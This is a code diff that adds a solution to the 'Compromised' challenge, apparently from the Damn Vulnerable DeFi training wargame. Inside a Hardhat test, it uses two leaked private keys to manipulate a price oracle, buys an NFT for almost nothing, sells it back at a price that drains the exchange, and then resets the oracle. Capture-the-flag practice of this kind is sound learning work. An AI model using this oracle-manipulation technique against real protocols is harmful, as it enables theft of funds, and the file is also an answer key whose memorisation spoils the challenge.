@@ -61,6 +61,49 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+		        const tokenSymbol = "DVNFT";
+		const passwords = [
+            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+        ]
+        const wallets = [];
+        for (let i = 0; i < passwords.length; i++) {
+            // do something with this, just need to get a non void signer::  change 
+            // "ethers.provider"  to w'e the fuck hardhat will supply from its network as a provider..... to @franz101
+            const wallet = new ethers.Wallet(passwords[i],ethers.provider)
+            wallets.push(wallet);
+        }
+
+        const startPrice = await this.oracle.getMedianPrice(tokenSymbol)
+        console.log(startPrice.toString())
+
+        for (let i = 0; i < wallets.length; i++) {
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,0);
+        }
+    
+        console.log("price manipulated")
+        const afterPrice = await this.oracle.getMedianPrice(tokenSymbol)
+        console.log(afterPrice.toString())
+        const reducedPrice = 1
+		const boughtNft = await this.exchange.connect(attacker).buyOne( { value: reducedPrice });
+        const tx = await boughtNft.wait()
+        const tokenId = tx.events.find(item=>item.event=='TokenBought').args.tokenId.toString()
+        console.log("Bought tokenId",tokenId)
+		const exchangeBalance = await ethers.provider.getBalance(this.exchange.address)
+
+        console.log("Balance",exchangeBalance.toString())
+        console.log(startPrice)
+		for (let i = 0; i < wallets.length; i++) {
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,  exchangeBalance);
+        }
+        const dumpPrice = await this.oracle.getMedianPrice(tokenSymbol)
+		console.log("dump price",dumpPrice.toString())
+		await this.nftToken.connect(attacker).approve(this.exchange.address,tokenId);
+		await this.exchange.connect(attacker).sellOne(tokenId);
+
+        for (let i = 0; i < wallets.length; i++) {
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,INITIAL_NFT_PRICE);
+        }
     });
 
     after(async function () {
